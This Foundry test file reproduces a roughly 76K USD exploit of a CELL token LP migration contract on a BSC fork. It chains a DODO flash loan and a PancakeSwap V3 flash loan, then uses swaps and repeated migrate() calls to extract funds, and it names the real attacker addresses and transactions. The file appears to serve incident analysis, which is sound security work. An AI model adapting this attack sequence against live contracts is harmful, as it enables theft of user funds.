// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~76K USD$
// Attacker - https://bscscan.com/address/0x2525c811ecf22fc5fcde03c67112d34e97da6079
// Attack contract - https://bscscan.com/address/0x1e2a251b29e84e1d6d762c78a9db5113f5ce7c48
// Attack Tx : https://bscscan.com/tx/0x943c2a5f89bc0c17f3fe1520ec6215ed8c6b897ce7f22f1b207fea3f79ae09a6
// Pre-Attack Tx: https://bscscan.com/tx/0xe2d496ccc3c5fd65a55048391662b8d40ddb5952dc26c715c702ba3929158cb9

// @Analysis - https://twitter.com/numencyber/status/1664132985883615235?cxt=HHwWhoDTqceImJguAAAA

interface IPancakeRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

interface ILpMigration {
    function migrate(uint256 amountLP) external;
}

contract ContractTest is Test {
    IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IPancakeV3Pool PancakePool = IPancakeV3Pool(0xA2C1e0237bF4B58bC9808A579715dF57522F41b2);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 CELL9 = Uni_Pair_V2(0x06155034f71811fe0D6568eA8bdF6EC12d04Bed2);
    IPancakePair PancakeLP = IPancakePair(0x1c15f4E3fd885a34660829aE692918b4b9C1803d);
    ILpMigration LpMigration = ILpMigration(0xB4E47c13dB187D54839cd1E08422Af57E5348fc1);
    IPancakeRouterV3 SmartRouter = IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 oldCELL = IERC20(0xf3E1449DDB6b218dA2C9463D4594CEccC8934346);
    IERC20 newCELL = IERC20(0xd98438889Ae7364c7E2A3540547Fad042FB24642);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address public constant zap = 0x5E86bD98F7BEFBF5C602EdB5608346f65D9578c3;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_708_273);
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(address(PancakePool), "PancakePool");
        cheats.label(address(Router), "Router");
        cheats.label(address(PancakeLP), "PancakeLP");
        cheats.label(address(LpMigration), "LpMigration");
        cheats.label(address(SmartRouter), "SmartRouter");
        cheats.label(address(CELL9), "CELL9");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(oldCELL), "oldCELL");
        cheats.label(address(newCELL), "newCELL");
        cheats.label(address(BUSD), "BUSD");
        cheats.label(zap, "Zap");
    }

    function testExploit() public {
        deal(address(WBNB), address(this), 0.1 ether);
        emit log_named_decimal_uint(
            "Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
        );

        // Preparation. Pre-attack transaction
        WBNB.approve(address(Router), type(uint256).max);
        swapTokens(address(WBNB), address(oldCELL), WBNB.balanceOf(address(this)));

        oldCELL.approve(zap, type(uint256).max);
        oldCELL.approve(address(Router), type(uint256).max);
        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)) / 2);

        Router.addLiquidity(
            address(oldCELL),
            address(WBNB),
            oldCELL.balanceOf(address(this)),
            WBNB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 100
        );

        // End of preparation. Attack start
        DPPOracle.flashLoan(1000 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        PancakePool.flash(
            address(this), 0, 500_000 * 1e18, hex"0000000000000000000000000000000000000000000069e10de76676d0800000"
        );
        newCELL.approve(address(SmartRouter), type(uint256).max);
        smartRouterSwap();

        swapTokens(address(newCELL), address(WBNB), 94_191_714_329_478_648_796_861);

        swapTokens(address(newCELL), address(BUSD), newCELL.balanceOf(address(this)));

        BUSD.approve(address(Router), type(uint256).max);
        swapTokens(address(BUSD), address(WBNB), BUSD.balanceOf(address(this)));

        WBNB.transfer(address(DPPOracle), 1000 * 1e18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        newCELL.approve(address(Router), type(uint256).max);
        CELL9.approve(address(LpMigration), type(uint256).max);

        swapTokens(address(newCELL), address(WBNB), 500_000 * 1e18);
        // Acquiring oldCELL tokens
        swapTokens(address(WBNB), address(oldCELL), 900 * 1e18);

        // Liquidity amount to migrate (for one call to migrate() func)
        uint256 lpAmount = CELL9.balanceOf(address(this)) / 10;
        emit log_named_uint("Amount of liquidity to migrate (for one migrate call)", lpAmount);

        // 8 calls to migrate were successfully. Ninth - revert in attack tx.
        for (uint256 i; i < 9; ++i) {
            LpMigration.migrate(lpAmount);
        }

        PancakeLP.transfer(address(PancakeLP), PancakeLP.balanceOf(address(this)));
        PancakeLP.burn(address(this));

        swapTokens(address(WBNB), address(newCELL), WBNB.balanceOf(address(this)));
        swapTokens(address(oldCELL), address(WBNB), oldCELL.balanceOf(address(this)));

        newCELL.transfer(address(PancakePool), 500_000 * 1e18 + fee1);
    }

    // Helper function for swap tokens with the use Pancake RouterV2
    function swapTokens(address from, address to, uint256 amountIn) internal {
        address[] memory path = new address[](2);
        path[0] = from;
        path[1] = to;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 100
        );
    }

    // Helper function for swap tokens with the use Pancake RouterV3
    function smartRouterSwap() internal {
        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3.ExactInputSingleParams({
            tokenIn: address(newCELL),
            tokenOut: address(WBNB),
            fee: 500,
            recipient: address(this),
            amountIn: 768_165_437_250_117_135_819_067,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        SmartRouter.exactInputSingle(params);
    }

    receive() external payable {}
}
